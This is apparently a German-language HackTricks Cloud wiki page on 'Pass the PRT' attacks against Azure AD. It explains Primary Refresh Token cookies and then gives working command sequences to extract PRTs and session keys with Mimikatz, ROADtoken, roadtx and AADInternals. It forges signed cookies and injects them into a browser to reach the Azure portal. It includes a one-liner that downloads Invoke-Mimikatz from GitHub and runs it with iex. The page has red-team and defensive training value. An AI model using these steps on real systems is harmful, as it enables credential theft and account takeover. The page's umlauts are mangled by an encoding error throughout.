# Az - Pass the PRT

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## Was ist ein PRT

{% content-ref url="az-primary-refresh-token-prt.md" %}
[az-primary-refresh-token-prt.md](az-primary-refresh-token-prt.md)
{% endcontent-ref %}

### √úberpr√ºfe, ob du ein PRT hast
```
Dsregcmd.exe /status
```
Im Abschnitt SSO-Status sollten Sie sehen, dass **`AzureAdPrt`** auf **JA** gesetzt ist.

<figure><img src="../../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

Im gleichen Output k√∂nnen Sie auch sehen, ob das **Ger√§t mit Azure verbunden ist** (im Feld `AzureAdJoined`):

<figure><img src="../../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

## PRT-Cookie

Das PRT-Cookie wird tats√§chlich **`x-ms-RefreshTokenCredential`** genannt und es ist ein JSON Web Token (JWT). Ein JWT enth√§lt **3 Teile**, den **Header**, **Payload** und **Signature**, die durch einen `.` getrennt und alle url-sicher base64-kodiert sind. Ein typisches PRT-Cookie enth√§lt den folgenden Header und Body:
```json
{
"alg": "HS256",
"ctx": "oYKjPJyCZN92Vtigt/f8YlVYCLoMu383"
}
{
"refresh_token": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAZ18nQkT-eD6Hqt7sf5QY0iWPSssZOto]<cut>VhcDew7XCHAVmCutIod8bae4YFj8o2OOEl6JX-HIC9ofOG-1IOyJegQBPce1WS-ckcO1gIOpKy-m-JY8VN8xY93kmj8GBKiT8IAA",
"is_primary": "true",
"request_nonce": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAPrlbf_TrEVJRMW2Cr7cJvYKDh2XsByis2eCF9iBHNqJJVzYR_boX8VfBpZpeIV078IE4QY0pIBtCcr90eyah5yAA"
}
```
Der tats√§chliche **Primary Refresh Token (PRT)** ist innerhalb des **`refresh_token`** kapsuliert, der durch einen Schl√ºssel unter der Kontrolle von Azure AD verschl√ºsselt ist, wodurch sein Inhalt f√ºr uns undurchsichtig und nicht entschl√ºsselbar wird. Das Feld **`is_primary`** zeigt die Kapselung des prim√§ren Refresh-Tokens innerhalb dieses Tokens an. Um sicherzustellen, dass das Cookie an die spezifische Anmeldesitzung gebunden bleibt, f√ºr die es bestimmt ist, wird der `request_nonce` von der Seite `logon.microsoftonline.com` √ºbertragen.

### PRT-Cookie-Flow mit TPM

Der **LSASS**-Prozess sendet den **KDF-Kontext** an das TPM, und das TPM verwendet den **Sitzungsschl√ºssel** (der beim Registrieren des Ger√§ts in AzureAD gesammelt und im TPM gespeichert wurde) und den vorherigen Kontext, um einen **Schl√ºssel abzuleiten**, und dieser **abgeleitete Schl√ºssel** wird verwendet, um das **PRT-Cookie (JWT)** zu **signieren**.

Der **KDF-Kontext ist** ein Nonce von AzureAD und der PRT, der einen **JWT** gemischt mit einem **Kontext** (Zufallsbytes) erstellt.

Daher, selbst wenn der PRT nicht extrahiert werden kann, weil er sich im TPM befindet, ist es m√∂glich, LSASS zu missbrauchen, um **abgeleitete Schl√ºssel aus neuen Kontexten anzufordern und die generierten Schl√ºssel zu verwenden, um Cookies zu signieren**.

<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

## PRT-Missbrauchsszenarien

Als **normaler Benutzer** ist es m√∂glich, **die Verwendung des PRT anzufordern**, indem man LSASS nach SSO-Daten fragt.\
Dies kann wie bei **nativem Apps** geschehen, die Tokens vom **Web Account Manager** (Token-Broker) anfordern. WAM leitet die Anfrage an **LSASS** weiter, das Tokens mit einer signierten PRT-Assertion anfordert. Oder es kann mit **browserbasierten (Web-)Flows** geschehen, bei denen ein **PRT-Cookie** als **Header** verwendet wird, um Anfragen an die Anmeldeseiten von Azure AS zu authentifizieren.

Als **SYSTEM** k√∂nnten Sie den PRT **stehlen, wenn er nicht durch TPM gesch√ºtzt ist** oder **mit PRT-Schl√ºsseln in LSASS interagieren**, indem Sie Krypto-APIs verwenden.

## Pass-the-PRT-Angriff Beispiele

### Angriff - ROADtoken

F√ºr weitere Informationen zu diesem Weg [**pr√ºfen Sie diesen Beitrag**](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/). ROADtoken wird **`BrowserCore.exe`** aus dem richtigen Verzeichnis ausf√ºhren und es verwenden, um ein **PRT-Cookie zu erhalten**. Dieses Cookie kann dann mit ROADtools verwendet werden, um sich zu authentifizieren und **einen persistenten Refresh-Token zu erhalten**.

Um ein g√ºltiges PRT-Cookie zu generieren, ben√∂tigen Sie zun√§chst ein Nonce.\
Sie k√∂nnen dies mit:
```powershell
$TenantId = "19a03645-a17b-129e-a8eb-109ea7644bed"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
"URI"     = $URL
"Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
AwABAAAAAAACAOz_BAD0_8vU8dH9Bb0ciqF_haudN2OkDdyluIE2zHStmEQdUVbiSUaQi_EdsWfi1 9-EKrlyme4TaOHIBG24v-FBV96nHNMgAA
```
Oder mit [**roadrecon**](https://github.com/dirkjanm/ROADtools):
```powershell
roadrecon auth prt-init
```
Dann k√∂nnen Sie [**roadtoken**](https://github.com/dirkjanm/ROADtoken) verwenden, um ein neues PRT zu erhalten (f√ºhren Sie das Tool aus einem Prozess des Benutzers aus, um anzugreifen):
```powershell
.\ROADtoken.exe <nonce>
```
{% code overflow="wrap" %}
```powershell
Invoke-Command - Session $ps_sess -ScriptBlock{C:\Users\Public\PsExec64.exe - accepteula -s "cmd.exe" " /c C:\Users\Public\SessionExecCommand.exe UserToImpersonate C:\Users\Public\ROADToken.exe AwABAAAAAAACAOz_BAD0__kdshsy61GF75SGhs_[...] > C:\Users\Public\PRT.txt"}
```
{% endcode %}

Dann k√∂nnen Sie das **generierte Cookie** verwenden, um **Token** zu **generieren**, um sich mit Azure AD **Graph** oder Microsoft Graph **anzumelden**:
```powershell
# Generate
roadrecon auth --prt-cookie <prt_cookie>

# Connect
Connect-AzureAD --AadAccessToken <token> --AccountId <acc_ind>
```
### Angriff - Verwendung von roadrecon

### Angriff - Verwendung von AADInternals und einem geleakten PRT

`Get-AADIntUserPRTToken` **holt das PRT-Token des Benutzers** von dem Azure AD-verbundenen oder Hybrid-verbundenen Computer. Verwendet `BrowserCore.exe`, um das PRT-Token zu erhalten.
```powershell
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```
Oder wenn Sie die Werte von Mimikatz haben, k√∂nnen Sie auch AADInternals verwenden, um ein Token zu generieren:
```powershell
# Mimikat "PRT" value
$MimikatzPRT="MC5BWU..."

# Add padding
while($MimikatzPrt.Length % 4) {$MimikatzPrt += "="}

# Decode
$PRT=[text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Mimikatz "Clear key" value
$MimikatzClearKey="37c5ecdfeab49139288d8e7b0732a5c43fac53d3d36ca5629babf4ba5f1562f0"

# Convert to Byte array and B64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzClearKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate PRTToken with Nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
$prtToken
## You can already use this token ac cookie in the browser

# Get access token from prtToken
$AT = Get-AADIntAccessTokenForAzureCoreManagement -PRTToken $prtToken

# Verify access and connect with Az. You can see account id in mimikatz prt output
Connect-AzAccount -AccessToken $AT -TenantID <tenant-id> -AccountId <acc-id>
```
Gehe zu [https://login.microsoftonline.com](https://login.microsoftonline.com), l√∂sche alle Cookies f√ºr login.microsoftonline.com und gib ein neues Cookie ein.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
Dann gehen Sie zu [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
Der Rest sollte die Standardwerte sein. Stellen Sie sicher, dass Sie die Seite aktualisieren k√∂nnen und das Cookie nicht verschwindet. Wenn es das tut, haben Sie m√∂glicherweise einen Fehler gemacht und m√ºssen den Prozess erneut durchlaufen. Wenn nicht, sollten Sie in Ordnung sein.
{% endhint %}

### Angriff - Mimikatz

#### Schritte

1. Das **PRT (Primary Refresh Token) wird aus LSASS** (Local Security Authority Subsystem Service) extrahiert und f√ºr die sp√§tere Verwendung gespeichert.
2. Der **Session Key wird als n√§chstes extrahiert**. Da dieser Schl√ºssel zun√§chst ausgegeben und dann vom lokalen Ger√§t erneut verschl√ºsselt wird, ist eine Entschl√ºsselung mit einem DPAPI-Masterkey erforderlich. Detaillierte Informationen zu DPAPI (Data Protection API) finden Sie in diesen Ressourcen: [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords) und f√ºr ein Verst√§ndnis seiner Anwendung, siehe [Pass-the-cookie attack](az-pass-the-cookie.md).
3. Nach der Entschl√ºsselung des Session Keys werden der **abgeleitete Schl√ºssel und der Kontext f√ºr das PRT** erhalten. Diese sind entscheidend f√ºr die **Erstellung des PRT-Cookies**. Insbesondere wird der abgeleitete Schl√ºssel verwendet, um das JWT (JSON Web Token), das das Cookie bildet, zu signieren. Eine umfassende Erkl√§rung dieses Prozesses wurde von Dirk-jan bereitgestellt und ist [hier](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/) zug√§nglich.

{% hint style="danger" %}
Beachten Sie, dass, wenn das PRT im TPM und nicht in `lsass` ist, **mimikatz es nicht extrahieren kann**.\
Es wird jedoch m√∂glich sein, einen Schl√ºssel aus einem abgeleiteten Schl√ºssel aus einem Kontext aus dem TPM zu erhalten und ihn zu **signieren (siehe Option 3).**
{% endhint %}

Sie finden eine **detaillierte Erkl√§rung des durchgef√ºhrten Prozesses**, um diese Details hier zu extrahieren: [**https://dirkjanm.io/digging-further-into-the-primary-refresh-token/**](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)

{% hint style="warning" %}
Dies wird nach den Korrekturen im August 2021 nicht genau funktionieren, um die PRT-Token anderer Benutzer zu erhalten, da nur der Benutzer sein PRT abrufen kann (ein lokaler Administrator kann nicht auf die PRTs anderer Benutzer zugreifen), aber kann auf sein eigenes zugreifen.
{% endhint %}

Sie k√∂nnen **mimikatz** verwenden, um das PRT zu extrahieren:
```powershell
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap

# Or in powershell
iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```
(Images from https://blog.netwrix.com/2023/05/13/pass-the-prt-overview)

<figure><img src="../../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>

**Kopiere** den Teil, der mit **Prt** gekennzeichnet ist, und speichere ihn.\
Extrahiere auch den Sitzungsschl√ºssel (den **`KeyValue`** des **`ProofOfPossesionKey`**-Feldes), den du unten hervorgehoben sehen kannst. Dieser ist verschl√ºsselt und wir m√ºssen unsere DPAPI-Masterkeys verwenden, um ihn zu entschl√ºsseln.

<figure><img src="../../../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Wenn du keine PRT-Daten siehst, k√∂nnte es sein, dass du **keine PRTs hast**, weil dein Ger√§t nicht mit Azure AD verbunden ist, oder es k√∂nnte sein, dass du **eine alte Version** von Windows 10 verwendest.
{% endhint %}

Um den **Sitzungsschl√ºssel zu entschl√ºsseln**, musst du deine Berechtigungen auf **SYSTEM** erh√∂hen, um im Computer-Kontext zu arbeiten und den **DPAPI-Masterkey zur Entschl√ºsselung zu verwenden**. Du kannst die folgenden Befehle verwenden, um dies zu tun:
```
token::elevate
dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```
<figure><img src="../../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

#### Option 1 - Vollst√§ndiges Mimikatz

* Jetzt m√∂chten Sie sowohl den Kontextwert kopieren:

<figure><img src="../../../.gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>

* Als auch den abgeleiteten Schl√ºsselwert:

<figure><img src="../../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

* Schlie√ülich k√∂nnen Sie all diese Informationen verwenden, um **PRT-Cookies zu generieren**:
```bash
Dpapi::cloudapkd /context:[CONTEXT] /derivedkey:[DerivedKey] /Prt:[PRT]
```
<figure><img src="../../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

* Gehe zu [https://login.microsoftonline.com](https://login.microsoftonline.com), l√∂sche alle Cookies f√ºr login.microsoftonline.com und gib ein neues Cookie ein.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
* Gehe dann zu [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
Der Rest sollte die Standardwerte sein. Stelle sicher, dass du die Seite aktualisieren kannst und das Cookie nicht verschwindet. Wenn es verschwindet, hast du m√∂glicherweise einen Fehler gemacht und musst den Prozess erneut durchlaufen. Wenn nicht, solltest du in Ordnung sein.
{% endhint %}

#### Option 2 - roadrecon mit PRT

* Erneuere zuerst das PRT, das in `roadtx.prt` gespeichert wird:

{% code overflow="wrap" %}
```bash
roadtx prt -a renew --prt <PRT From mimikatz> --prt-sessionkey <clear key from mimikatz>
```
{% endcode %}

* Jetzt k√∂nnen wir **Tokens anfordern**, indem wir den interaktiven Browser mit `roadtx browserprtauth` verwenden. Wenn wir den Befehl `roadtx describe` verwenden, sehen wir, dass das Zugriffstoken einen MFA-Anspruch enth√§lt, da der PRT, den ich in diesem Fall verwendet habe, ebenfalls einen MFA-Anspruch hatte.
```bash
roadtx browserprtauth
roadtx describe < .roadtools_auth
```
<figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

#### Option 3 - roadrecon mit abgeleiteten Schl√ºsseln

Mit dem Kontext und dem von mimikatz ausgegebenen abgeleiteten Schl√ºssel ist es m√∂glich, roadrecon zu verwenden, um ein neues signiertes Cookie zu generieren mit:

{% code overflow="wrap" %}
```bash
roadrecon auth --prt-cookie <cookie> --prt-context <context> --derives-key <derived key>
```
{% endcode %}

## Referenzen

* [https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)
* [https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
* [https://www.youtube.com/watch?v=x609c-MUZ\_g](https://www.youtube.com/watch?v=x609c-MUZ\_g)

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
